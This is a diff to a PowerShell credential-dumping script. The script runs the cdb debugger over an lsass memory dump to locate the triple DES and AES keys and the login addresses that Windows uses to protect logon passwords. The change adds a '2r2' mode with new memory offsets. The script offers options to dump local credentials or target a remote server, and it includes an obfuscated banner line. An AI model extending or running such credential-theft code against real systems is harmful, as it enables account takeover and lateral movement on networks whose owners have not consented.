@@ -71,7 +71,7 @@ $scriptVersion = "0.1"
 
 Write-Host -object (("1*0½1*1½1*3½1*0½1*1½1*1½1*3½1*1½*1½1*2½1*3½1*1½1*1½1*1½1*9½1*10½1*11½1*11½1*10½1*12½1*1½1*13½1*14½1*15½1*1½1*12½1*14½1*16½1*13½1*15½1*1½1*17½1*18½1*19½1*19½1*16½1*13½1*1½1*20½1*21½1*22½1*0½1*1½1*1½0*1½1*5½1*1½1*7½1*1½1*1½1*1½1*1½1*1½1*1½1*1½1*23½1*18½1*27½1*24½1*18½1*15½1*25½1*15½1*26½1*8½1*28½1*29½1*18½1*16½1*11½1*6½1*30½1*10½1*29½1*0½1*6½1*5½1*1½1*8½1*1½1*7½1*6½1*1½1*0"-split "½")-split "_"|%{if($_-match "(\d+)\*(\d+)"){"$([char][int]("10T32T47T92T95T40T46T41T64T70T111T108T119T116T104T101T105T82T97T98T58T45T41T112T114T107T110T98T103T109T99"-split "T")[$matches[2]])"*$matches[1]}})-separator ""
 
-$mode = Read-Host 'Mode (1, 132, 2 or 3)?'
+$mode = Read-Host 'Mode (1, 132, 2, 2r2 or 3)?'
 $dump = Read-Host 'gen = local credentials dump __ or __ file name of a dump __ or __ nothing -> ""'
 $server = Read-Host 'Name of the remote server (if second parameter = "")'
 
@@ -583,7 +583,7 @@ else {
     }
 }
     
-if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2) {
+if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2 -or $mode -eq "2r2") {
     <#________________________________________________________________________
 
         Get the triple DES key in the lsass dump memory file
@@ -623,9 +623,10 @@ if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2) {
     [io.file]::WriteAllText($DebuggingScript,"dw $secondAddress") | Out-Null   
     $thirdAddress = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q"                  
     $arrayThirdAddress = ($thirdAddress -split ' ')  
-    
+        
     if($mode -eq 1) { $start = 20}
     if($mode -eq 2) { $start = 30}
+    if($mode -eq "2r2") { $start = 40}
 
     $passAddress1 = ""
     $j = 0
@@ -651,7 +652,7 @@ if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2) {
         $keyAddress += "$comma"+"0x$keyAddress1, 0x$keyAddress2"
         $j++
     }        
-    $tripleDESKeyHex = $keyAddress       
+    $tripleDESKeyHex = $keyAddress           
     <#________________________________________________________________________
 
         Get the AES key in the lsass dump memory file
@@ -843,7 +844,7 @@ if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2) {
         
         if($mode -eq 1) { $start = 48}
         if($mode -eq 132) { $start = 17}
-        if($mode -eq 2) { $start = 24}
+        if($mode -eq 2 -or $mode -eq "2r2") { $start = 24}
          
         $foundInstruction = [array]::indexof($arrayLoginAddress,"dd") + $start
         $loginAddress1 = $arrayLoginAddress[$foundInstruction] 
